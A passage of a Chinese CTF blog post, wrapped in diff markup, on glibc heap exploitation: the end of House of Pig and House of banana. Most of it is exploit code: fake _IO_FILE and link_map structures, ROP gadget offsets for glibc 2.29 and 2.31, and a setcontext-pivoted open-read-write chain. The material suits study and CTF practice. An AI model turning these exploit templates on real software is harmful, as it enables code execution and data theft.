class="number">0x18</span>)  <span class="comment">#set _IO_buf_end  (old_buf(end))   </span></span><br><span class="line"><span class="comment">#old_blen=old_buf(start)-old_buf(end)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                    <span class="comment">#change _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_str_vtable)        <span class="comment">#change vtable to _IO_str_jumps</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="2-触发条件-2"   >
+          <a href="#2-触发条件-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-触发条件-2" class="headerlink" title="2.触发条件"></a>2.触发条件</h2>
+      <p>(1)Libc结构被破坏的abort函数中会调用刷新<br>(2)调用exit()<br>(3)能够从main函数返回</p>
+
+        <h2 id="3-适用条件-2"   >
+          <a href="#3-适用条件-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-适用条件-2" class="headerlink" title="3.适用条件"></a>3.适用条件</h2>
+      <p>程序只能通过calloc来获取chunk时</p>
+
+        <h1 id="四、House-of-banana"   >
+          <a href="#四、House-of-banana" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、House-of-banana" class="headerlink" title="四、House of banana"></a>四、House of banana</h1>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222948" >house of banana - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/211331" >main_arena劫持及link_map劫持 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="1-原理分析-3"   >
+          <a href="#1-原理分析-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-原理分析-3" class="headerlink" title="1.原理分析"></a>1.原理分析</h2>
+      <p>函数调用链：<strong>exit()-&gt;_dl_fini-&gt;(fini_t)array[i]</strong></p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.31 glibc/elf/dl_fini.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">        (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">                        + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                      / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">    <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">        ((<span class="keyword">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>所以如果可以使得*array[i] = one_gadget，那么就可以一键getshell。而array[i]调用时这里就有两种套路：</p>
+
+        <h3 id="1-伪造link-map结构体"   >
+          <a href="#1-伪造link-map结构体" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-伪造link-map结构体" class="headerlink" title="(1)伪造link_map结构体"></a>(1)伪造link_map结构体</h3>
+      <p>直接伪造<code>link_map</code>结构体，将原本指向<code>link_map</code>的指针指向我们伪造的<code>link_map</code>，然后伪造其中数据，绕过检查，最后调用array[i]。这里通常利用largebin attack来将堆地址写到<code>_rtld_global</code>这个结构体指针中。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830185253.png"></p>
+<p><code>link_map</code>的布局通常如下：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#largebin attack&#x27;s chunk</span></span><br><span class="line"><span class="comment">#*_rtld_local=fake_link_map_chunk_addr</span></span><br><span class="line">fake_link_map_chunk_addr = heap_base+<span class="number">0x001000</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x448</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x448</span>)  <span class="comment">#empty the fake_link_map_chunk</span></span><br><span class="line">fake_link_map_data = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_link_map_data += p64(<span class="number">0</span>) + p64(fake_link_map_chunk_addr + <span class="number">0x20</span>)		<span class="comment">#0 1</span></span><br><span class="line">fake_link_map_data += p64(<span class="number">0</span>) + p64(fake_link_map_chunk_addr)			<span class="comment">#2 3</span></span><br><span class="line">fake_link_map_data += p64(<span class="number">0</span>) + p64(fake_link_map_chunk_addr + <span class="number">0x28</span>)		<span class="comment">#4 5</span></span><br><span class="line">fake_link_map_data += p64(fake_link_map_chunk_addr + <span class="number">0x50</span>) + p64(fake_link_map_chunk_addr + <span class="number">0x20</span>)									 </span><br><span class="line"><span class="comment">#6 7</span></span><br><span class="line">fake_link_map_data += p64(fake_link_map_chunk_addr+<span class="number">0x28</span>) + p64(<span class="number">0x0</span>)		<span class="comment">#8 9</span></span><br><span class="line">fake_link_map_data += p64(<span class="number">0</span>) + p64(<span class="number">0x0</span>)									<span class="comment">#10 11</span></span><br><span class="line">fake_link_map_data += p64(<span class="number">0</span>) + p64(fake_link_map_chunk_addr + <span class="number">0x50</span>)		<span class="comment">#12 13</span></span><br><span class="line">fake_link_map_data =  fake_link_map_data.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_link_map_data += p64(fake_link_map_chunk_addr + <span class="number">0x190</span>) + p64(<span class="number">0</span>)			</span><br><span class="line"><span class="comment">#0x20 0x21</span></span><br><span class="line">fake_link_map_data += p64(fake_link_map_chunk_addr + <span class="number">0x128</span>) + p64(<span class="number">0</span>)		</span><br><span class="line"><span class="comment">#0x22 0x23</span></span><br><span class="line">fake_link_map_data += p64(<span class="number">0x8</span>) + p64(<span class="number">0</span>)									<span class="comment">#0x24 0x25</span></span><br><span class="line">fake_link_map_data =  fake_link_map_data.ljust(<span class="number">0x180</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_link_map_data += p64(<span class="number">0x1A</span>) + p64(<span class="number">0x0</span>)								<span class="comment">#0x30 0x31</span></span><br><span class="line">fake_link_map_data += p64(elf_base + elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]) + p64(<span class="number">0</span>)		<span class="comment">#0x32 0x33</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#set fake_chunk-&gt;pre_size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0xd68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xd60</span>+p64(fake_link_map_chunk_addr + <span class="number">0x1a0</span>))</span><br><span class="line">fake_link_map_data = fake_link_map_data.ljust(<span class="number">0x308</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map_data += p64(<span class="number">0x800000000</span>)</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830212809.png" alt="Snipaste_2021-08-29_09-49-17"></p>
+
+        <h3 id="2-修改link-map结构体数据"   >
+          <a href="#2-修改link-map结构体数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-修改link-map结构体数据" class="headerlink" title="(2)修改link_map结构体数据"></a>(2)修改link_map结构体数据</h3>
+      <p>修改对应link_map结构体中的数据，绕过检查，最终调用array[i]。这里就通常需要利用任意申请来申请到该结构体，然后修改其中的值，因为当调用array[i]时，传入的实际上是link_map中的某个地址，即rdx为link_map+0x30，这个不同版本好像不太一样，2.31及以上为link_map+0x38。</p>
+<p>主要伪造以下数据：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830191318.png" alt="Snipaste_2021-08-30_18-56-38"></p>
+<p>这个方法常用来打ORW，因为可以我们可以直接将ROP链布置在link_map中。然而因为版本间的关系，所以数据也有点不同，实际布局：</p>
+
+        <h4 id="2-31"   >
+          <a href="#2-31" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h4>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830184953.png" alt="Snipaste_2021-08-30_18-49-43"></p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">//docker <span class="number">2.31</span> gadget</span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000026b72</span>;</span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000027529</span>;</span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000004a550</span>;</span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000066229</span>;</span><br><span class="line">pop_rdx_r10_ret = libc_base + <span class="number">0x000000000011c371</span></span><br><span class="line">setcontext_addr = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;setcontext_addr&quot;</span>,setcontext_addr)</span><br><span class="line">ret = pop_rdi_ret+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">fake_link_map_chunk_addr = top_chunk_hijack+<span class="number">0x4</span>+<span class="number">0x10</span></span><br><span class="line">fake_rsp = fake_link_map_chunk_addr + <span class="number">8</span>*<span class="number">8</span></span><br><span class="line">flag = fake_link_map_chunk_addr + <span class="number">30</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">orw = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#fake_rsp_addr =  fake_link_map_chunk_addr + 8*8</span></span><br><span class="line">orw += p64(pop_rdi_ret) + p64(flag)										<span class="comment">#8</span></span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall_ret)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(fake_rsp+<span class="number">0x200</span>)</span><br><span class="line">orw += p64(pop_rdx_r10_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">orw += p64(libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_link_map_data = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#set l_addr(0) point to fini_array</span></span><br><span class="line">fake_link_map_data += p64(fake_link_map_chunk_addr+<span class="number">0x20</span>) + p64(<span class="number">0x0</span>)   	<span class="comment">#0 	1</span></span><br><span class="line"><span class="comment">#set l_next(3) and *(l_next)=vdso_addr</span></span><br><span class="line">fake_link_map_data += p64(<span class="number">0x0</span>) + p64(fake_link_map_chunk_addr+<span class="number">0x5b0</span>)  	<span class="comment">#2 	3</span></span><br><span class="line"><span class="comment">#set l_real(5) point to fake_link_map_chunk_addr</span></span><br><span class="line">fake_link_map_data += p64(<span class="number">0x0</span>) + p64(fake_link_map_chunk_addr)			<span class="comment">#4 	5</span></span><br><span class="line">fake_link_map_data += p64(setcontext_addr+<span class="number">61</span>) + p64(ret)				<span class="comment">#6 	7</span></span><br><span class="line">fake_link_map_data += orw												<span class="comment">#8~25</span></span><br><span class="line">fake_link_map_data = fake_link_map_data.ljust(<span class="number">26</span>*<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#for rcx  push rcx</span></span><br><span class="line">fake_link_map_data += p64(<span class="number">0x0</span>) + p64(fake_rsp)							<span class="comment">#26 27</span></span><br><span class="line">fake_link_map_data += p64(ret) + p64(<span class="number">0x0</span>)								<span class="comment">#28 29</span></span><br><span class="line"><span class="comment">#flag_addr = fake_link_map_chunk_addr + 30*8</span></span><br><span class="line">fake_link_map_data += <span class="string">&#x27;./flag\x00\x00&#x27;</span>									<span class="comment">#30</span></span><br><span class="line">fake_link_map_data = fake_link_map_data.ljust(<span class="number">34</span>*<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)				<span class="comment">#30~33</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake circle link_list</span></span><br><span class="line">fake_link_map_data += p64(fake_link_map_chunk_addr+<span class="number">0x110</span>) + p64(<span class="number">0x0</span>)	<span class="comment">#34 35</span></span><br><span class="line">fake_link_map_data += p64(fake_link_map_chunk_addr+<span class="number">0x120</span>) + p64(<span class="number">0x20</span>)	<span class="comment">#36 37</span></span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h4 id="2-29"   >
+          <a href="#2-29" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-29" class="headerlink" title="2.29"></a>2.29</h4>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830161702.png" alt="Snipaste_2021-08-30_16-16-41"></p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">//docker <span class="number">2.29</span> gadget</span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000026542</span>;</span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000026f9e</span>;</span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000047cf8</span>;</span><br><span class="line">syscall_ret = libc_base + <span class="number">0x00000000000cf6c5</span>;</span><br><span class="line">pop_rdx_r10_ret = libc_base + <span class="number">0x000000000012bda4</span></span><br><span class="line">setcontext_addr = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;setcontext_addr&quot;</span>,setcontext_addr)</span><br><span class="line">ret = pop_rdi_ret+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_link_map_chunk_addr = top_chunk_hijack+<span class="number">0x4</span>+<span class="number">0x10</span></span><br><span class="line">fake_rsp = fake_link_map_chunk_addr + <span class="number">8</span>*<span class="number">8</span></span><br><span class="line">flag = fake_link_map_chunk_addr + <span class="number">30</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">orw = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#fake_rsp_addr =  fake_link_map_chunk_addr + 8*8</span></span><br><span class="line">orw += p64(pop_rdi_ret) + p64(flag)										<span class="comment">#8</span></span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall_ret)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(fake_rsp+<span class="number">0x200</span>)</span><br><span class="line">orw += p64(pop_rdx_r10_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">orw += p64(libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_link_map_data = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#set l_addr(0) point to fini_array</span></span><br><span class="line">fake_link_map_data += p64(fake_link_map_chunk_addr+<span class="number">0x20</span>) + p64(<span class="number">0x0</span>)   	<span class="comment">#0 	1</span></span><br><span class="line"><span class="comment">#set l_next(3) and *(l_next)=vdso_addr</span></span><br><span class="line">fake_link_map_data += p64(<span class="number">0x0</span>) + p64(fake_link_map_chunk_addr+<span class="number">0x5a0</span>)  	<span class="comment">#2 	3</span></span><br><span class="line"><span class="comment">#set l_real(5) point to fake_link_map_chunk_addr</span></span><br><span class="line">fake_link_map_data += p64(<span class="number">0x0</span>) + p64(fake_link_map_chunk_addr)			<span class="comment">#4 	5</span></span><br><span class="line">fake_link_map_data += p64(setcontext_addr+<span class="number">53</span>) + p64(ret)				<span class="comment">#6 	7</span></span><br><span class="line">fake_link_map_data += orw												<span class="comment">#8~25</span></span><br><span class="line">fake_link_map_data = fake_link_map_data.ljust(<span class="number">26</span>*<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#for rcx  push rcx</span></span><br><span class="line">fake_link_map_data += p64(fake_rsp) + p64(ret)							<span class="comment">#26 27</span></span><br><span class="line">fake_link_map_data += p64(<span class="number">0x0</span>) + p64(<span class="number">0x0</span>)								<span class="comment">#28 29</span></span><br><span class="line"><span class="comment">#flag_addr = fake_link_map_chunk_addr + 30*8</span></span><br><span class="line">fake_link_map_data += <span class="string">&#x27;./flag\x00\x00&#x27;</span>									<span class="comment">#30</span></span><br><span class="line">fake_link_map_data = fake_link_map_data.ljust(<span class="number">34</span>*<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)				<span class="comment">#30~33</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake circle link_list</span></span><br><span class="line">fake_link_map_data += p64(fake_link_map_chunk_addr+<span class="number">0x110</span>) + p64(<span class="number">0x0</span>)	<span class="comment">#34 35</span></span><br><span class="line">fake_link_map_data += p64(fake_link_map_chunk_addr+<span class="number">0x120</span>) + p64(<span class="number">0x20</span>)	<span class="comment">#36 37</span></span><br></pre></td></tr></table></div></figure>
+
+<p>▲这里需要注意的是由于ld动态连接加载的事情，所以就算是同一个版本中的link_map相对于libc基地址在不同机器中也有可能是不同的，需要爆破第4，5两位，一个字节。</p>
+
+        <h2 id="2-触发条件-3"   >
+          <a href="#2-触发条件-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-触发条件-3" class="headerlink" title="2.触发条件"></a>2.触发条件</h2>
+      <p>(1)调用exit()<br>(2)能够从main函数返回</p>
+
+        <h3 id="3-适用条件-3"   >
+          <a href="#3-适用条件-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-适用条件-3" class="headerlink" title="3.适用条件"></a>3.适用条件</h3>
+      <p>ban掉了很多东西的时候。但是这个需要泄露地址才行的，另外由于可能需要爆破一个字节，所以如果还涉及其他的爆破就得慎重考虑一下了，别到时候爆得黄花菜都凉了。</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2021/08/20/%E9%AB%98%E7%89%88%E6%9C%AC%E5%A0%86%E5%90%84%E7%B1%BB%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/">http://pig-007.github.io/2021/08/20/%E9%AB%98%E7%89%88%E6%9C%AC%E5%A0%86%E5%90%84%E7%B1%BB%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/Heap/">Heap</a></span></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2021/08/19/%E5%90%84%E7%89%88%E6%9C%ACUAF%E4%B8%93%E5%9C%BA/"><span class="paginator-prev__text">各版本UAF专场</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81House-of-KIWI"><span class="toc-text">
+          一、House of KIWI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">
+          1.原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-rdi%E5%92%8Crdx%E4%BA%92%E7%9B%B8%E8%BD%AC%E6%8D%A2"><span class="toc-text">
+          (1)rdi和rdx互相转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%8D%E5%90%8C%E5%8A%AB%E6%8C%81"><span class="toc-text">
+          (2)不同劫持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6"><span class="toc-text">
+          2.触发条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E9%80%82%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">
+          3.适用条件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81House-of-Husk"><span class="toc-text">
+          二、House of Husk</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-1"><span class="toc-text">
+          1.原理分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6-1"><span class="toc-text">
+          2.触发条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E9%80%82%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-text">
+          3.适用条件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81House-of-Pig"><span class="toc-text">
+          三、House of Pig</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-2"><span class="toc-text">
+          1.原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86"><span class="toc-text">
+          (1)劫持原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Getshell%E5%8E%9F%E7%90%86"><span class="toc-text">
+          (2)Getshell原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%87%BD%E6%95%B0%E6%B5%81%E7%A8%8B"><span class="toc-text">
+          ①函数流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%8A%AB%E6%8C%81%E6%89%80%E9%9C%80%E6%95%B0%E6%8D%AE"><span class="toc-text">
+          ②劫持所需数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6-2"><span class="toc-text">
+          2.触发条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E9%80%82%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="toc-text">
+          3.适用条件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81House-of-banana"><span class="toc-text">
+          四、House of banana</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-3"><span class="toc-text">
+          1.原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BC%AA%E9%80%A0link-map%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-text">
+          (1)伪造link_map结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9link-map%E7%BB%93%E6%9E%84%E4%BD%93%E6%95%B0%E6%8D%AE"><span class="toc-text">
+          (2)修改link_map结构体数据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-31"><span class="toc-text">
+          2.31</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-29"><span class="toc-text">
+          2.29</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6-3"><span class="toc-text">
+          2.触发条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%80%82%E7%94%A8%E6%9D%A1%E4%BB%B6-3"><span class="toc-text">
+          3.适用条件</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">94</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">41</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">43</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div 